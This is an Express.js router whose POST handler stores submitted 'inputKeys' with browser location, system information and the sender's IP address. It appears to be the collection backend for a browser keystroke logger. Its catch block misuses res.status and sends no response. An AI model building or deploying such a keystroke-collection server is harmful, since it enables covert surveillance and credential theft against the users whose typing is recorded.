const express=require("express")
const Router=express.Router()
 const validateInputKeyData= require("../validations/validateInputKeyData")
const  InputKeyData=require("../model/inpuyKeyData")
Router.post("/",async(req,res)=>{
    console.log(req.body)
//   console.log(req.socket.remoteAddress)
  const inputIsvalid=  validateInputKeyData(req.body)
   if(inputIsvalid !==true)return res.status(400).json({error:true,errMessage:inputIsvalid})

   try{
   
   const response= await new InputKeyData({
    browserLocation:req.body.browserLocation,
      systemInfo: req.body.systemInfo,
      ipAddress:req.socket.remoteAddress,
      inputKeys:req.body.inputKeys
    })
    const result=await response.save()
    res.status(200).json({error:false,message:result})
   }catch(err){
     res.status({error:true,errMessage:err.message})
   }

})

module.exports=Router